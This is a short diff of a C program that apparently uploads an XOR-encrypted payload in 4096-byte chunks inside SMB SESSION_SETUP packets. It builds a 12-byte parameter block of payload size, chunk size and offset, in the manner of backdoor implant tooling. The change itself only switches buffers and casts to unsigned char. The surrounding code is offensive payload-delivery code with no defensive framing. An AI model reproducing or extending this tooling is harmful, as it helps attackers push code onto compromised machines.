@@ -665,7 +665,7 @@ int main(int argc, char* argv[])
 	int iterations = encrypted_buffer_len % 4096;
 	printf("will send %d packets of data\n ", numberofpackets);
 	printf("%d as a remainder\n", iterations);
-	char Parametersbuffer[12];
+	unsigned char Parametersbuffer[12];
 	
 	//PayloadSize is NOT correct; needs to be updated to actual value
 	unsigned int payload_size = 0x507308 ^ XorKey; //UPDATE PAYLOAD SIZE 
@@ -712,9 +712,9 @@ int main(int argc, char* argv[])
 			//update Offset value to current offset value
 			o_offset = ctx ^ XorKey;
 			//copy separate parameter values to the Parametersbuffer value
-			memcpy(Parametersbuffer, (char*)&payload_size, 4);
-			memcpy(Parametersbuffer + 4, (char*)&chunk_size, 4);
-			memcpy(Parametersbuffer + 8, (char*)&o_offset, 4);
+			memcpy(Parametersbuffer, (unsigned char*)&payload_size, 4);
+			memcpy(Parametersbuffer + 4, (unsigned char*)&chunk_size, 4);
+			memcpy(Parametersbuffer + 8, (unsigned char*)&o_offset, 4);
 			
 			//copy the encrypted SESSION_SETUP parameters here before copying the last encrypted portion of the payload
 			memcpy(big_packet + 70, Parametersbuffer, 12);
